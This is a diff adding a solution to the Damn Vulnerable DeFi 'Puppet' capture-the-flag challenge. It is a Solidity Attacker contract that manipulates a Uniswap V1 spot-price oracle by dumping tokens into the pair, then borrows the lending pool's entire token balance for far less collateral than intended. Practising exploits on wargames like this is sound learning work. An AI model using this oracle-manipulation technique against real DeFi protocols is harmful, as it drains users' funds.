@@ -92,7 +92,14 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Set up the attacker.
+        // Give that contract all the player's ETH and DVT.
+        Attacker attacker = new Attacker
+            {value: PLAYER_INITIAL_ETH_BALANCE}
+            (player, recovery, lendingPool, token, uniswapV1Exchange);
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        attacker.attack();
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +122,50 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+// To ensure Forge tracks the transaction, the attack must be implemented
+// in a contract rather than the test_puppet() function.
+contract Attacker {
+    address internal player;
+    address internal recovery;
+
+    PuppetPool internal lendingPool;
+    DamnValuableToken internal token;
+    IUniswapV1Exchange internal uniswapV1Exchange;
+
+    constructor(address _player,
+            address _recovery,
+            PuppetPool _lendingPool,
+            DamnValuableToken _token,
+            IUniswapV1Exchange _uniswapV1Exchange) payable {
+        player = _player;
+        recovery = _recovery;
+
+        lendingPool = _lendingPool;
+        token = _token;
+        uniswapV1Exchange = _uniswapV1Exchange;
+    }
+
+    function attack() external {
+        // The pool contains 10 ETH and 10 DVT.
+        // A trade of 1000 DVT will significantly impact the price of DVT, making it much cheaper.
+        //
+        // The lending pool calculates the borrow price using the ratio of
+        // uniswapPair.balance / token.balanceOf(uniswapPair).
+        //
+        // By increasing the amount of DVT in the Uniswap V1 pair, the required ETH to
+        // borrow decreases. After trading the 1000 DVT with the pair, we can borrow
+        // 100,000 DVT from the pool using only 19.66 ETH, instead of the initial
+        // 200,000 ETH.
+        token.approve(address(uniswapV1Exchange), 1000e18);
+        uniswapV1Exchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);
+
+        uint256 requiredETH = lendingPool.calculateDepositRequired(100_000e18);
+        lendingPool.borrow{value: requiredETH}(100_000e18, address(this));
+
+        token.transfer(address(recovery), token.balanceOf(address(this)));
+    }
+
+    receive() external payable {}
 }
